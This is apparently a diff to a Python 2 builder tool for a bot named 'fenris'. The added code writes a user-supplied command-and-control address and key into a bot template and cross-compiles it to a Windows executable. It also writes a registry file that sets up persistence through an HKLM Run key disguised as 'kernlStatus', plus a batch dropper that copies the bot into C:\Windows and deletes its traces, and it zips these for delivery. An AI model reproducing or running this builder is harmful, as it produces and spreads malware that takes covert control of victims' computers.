@@ -44,10 +44,68 @@ else:
 	# help menu
 	if "-h" in sys.argv or "--help" in sys.argv:
 		print usageString
-		print myTool.blue + "[-cf|--create-fenris]" + myTool.stop + "\tCreate a wild fenris."
-		print myTool.blue + "[-h|--help]" + myTool.stop + "\t\tDisplays this help menu."		
-		print myTool.blue + "[-s|--setup]" + myTool.stop + "\t\tPerform setup."
+		print myTool.blue + "[-cf|--create-fenris]" + myTool.stop + "\t\tCreate a wild fenris."
+		print myTool.blue + "[-h|--help]" + myTool.stop + "\t\t\tDisplays this help menu."		
+		print myTool.blue + "[-s|--setup]" + myTool.stop + "\t\t\tPerform setup."
+		print myTool.blue + "[-bci|--bot-creation-interface]" + myTool.stop + "\tStart web interface for bot creation."
 		print ""
+		sys.exit()
+	
+	if "-bci" in sys.argv or "--bot-creation-interface" in sys.argv:
+		print myTool.green + "[+]" + myTool.stop + " Web interface for bot creation started."
+		print myTool.green + "[+]" + myTool.stop + " Visit http://127.0.0.1:8000/cgi-bin/index.html"
+		os.system("python -m CGIHTTPServer")
+	
+	if "-a" in sys.argv:
+		# get bot parameters
+		execName = sys.argv[2]
+		candc = sys.argv[3]
+		key = sys.argv[4]
+
+		# get environment parameters
+		f = open("config", "r")
+		configContent = f.readlines()
+		configContent = configContent[0].split(",")
+		venvPath = configContent[0]
+		pyPath = configContent[1]
+
+		# update fenris.py
+                f = open("fenrisTemplate.py", "r")
+                newFileContent = ""
+                for line in f.readlines():
+                        if "[DUMMYCANDC]" in line:
+                                line = "candc = \"" + candc + "\"\n"
+                        if "[DUMMYKEY]" in line:
+                                line = "key = \"" + key + "\"\n"
+                        newFileContent += line
+                f.close()
+                f = open("fenris.py", "w")
+                f.write(newFileContent)
+                f.close()
+
+		# create registry key and add it
+                botRegFilename = str(randint(0, 5000)) + ".reg"
+		botRegPayload = "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n\"kernlStatus\"=\"C:\\\\Windows\\\\" + execName + ".exe\""
+		botReg = open(botRegFilename, "w")
+		botReg.write(botRegPayload)
+		botReg.close()		
+		
+		# create batch file
+		batContent = "start\r\nregedit /s " + botRegFilename + "\r\ncopy \"" + execName + ".exe\" \"C:\\Windows\\" + execName + ".exe\"\r\ndel \"" + execName + ".exe\"\r\ndel \"" + botRegFilename + "\"\r\nexit"
+		batFile = open(execName + ".bat", "w")
+		batFile.write(batContent)
+		batFile.close()
+		
+		# cross compile...
+                os.system(". " + venvPath + "/bin/activate; wine c:/Python27/python.exe " + pyPath + " -w -a -F fenris.py")
+
+		# make zip
+                os.system("cp dist/fenris.exe " + execName + ".exe")
+                os.system("zip " + execName + ".zip " + execName + ".bat " + botRegFilename + " " + execName + ".exe")
+                os.system("rm " + execName + ".bat")
+                os.system("rm " + execName + ".exe")
+                os.system("rm " + botRegFilename)
+
 		sys.exit()
 
 	if "-cf" in sys.argv or "--create-fenris" in sys.argv:
